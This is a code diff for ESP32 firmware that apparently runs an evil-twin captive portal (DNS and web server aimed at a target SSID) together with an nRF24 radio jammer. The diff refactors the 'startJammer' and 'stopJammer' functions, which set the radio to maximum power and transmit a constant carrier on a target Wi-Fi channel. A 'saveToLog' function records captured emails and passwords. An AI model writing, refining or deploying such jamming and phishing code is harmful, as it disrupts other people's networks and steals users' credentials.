@@ -4,7 +4,7 @@
 #include <DNSServer.h>
 #include <WebServer.h>
 #include <U8g2lib.h>
-#include <RF24.h>
+#include "nrf_helper.h"
 #include "FS.h"
 #include "SPIFFS.h"
 #include "app_config.h"
@@ -15,9 +15,7 @@
 extern String target_ssid; 
 extern int target_channel;
 extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
-extern RF24 jam1;
-extern RF24 jam2;
-extern bool runningApp; // Necesaria para salir al menú principal
+extern bool runningApp; // Necesaria para exit al menú principal
 
 DNSServer dnsServer;
 WebServer server(80);
@@ -105,25 +103,18 @@ static void drawPortalActiveHeader(uint8_t frame) {
 
 #define BTN_ATTACK 27 
 
-// --- FUNCIONES DE ATAQUE RF (Sin cambios) ---
+// --- FUNCIONES DE ATAQUE RF ---
 void startJammer(int channel) {
     int rf_ch = (channel - 1) * 5 + 12;
-    jam1.begin();
-    jam1.setPALevel(RF24_PA_MAX);
-    jam1.setDataRate(RF24_2MBPS);
-    jam1.setChannel(rf_ch);
-    jam1.startConstCarrier(RF24_PA_MAX, rf_ch);
-    
-    jam2.begin();
-    jam2.setPALevel(RF24_PA_MAX);
-    jam2.setDataRate(RF24_2MBPS);
-    jam2.setChannel(rf_ch + 3); 
-    jam2.startConstCarrier(RF24_PA_MAX, rf_ch + 3);
+    activeRadio->begin();
+    activeRadio->setPALevel(RF24_PA_MAX);
+    activeRadio->setDataRate(RF24_2MBPS);
+    activeRadio->setChannel(rf_ch);
+    activeRadio->startConstCarrier(RF24_PA_MAX, rf_ch);
 }
 
 void stopJammer() {
-    jam1.stopConstCarrier();
-    jam2.stopConstCarrier();
+    activeRadio->stopConstCarrier();
 }
 
 void saveToLog(String email, String pass, String header) {
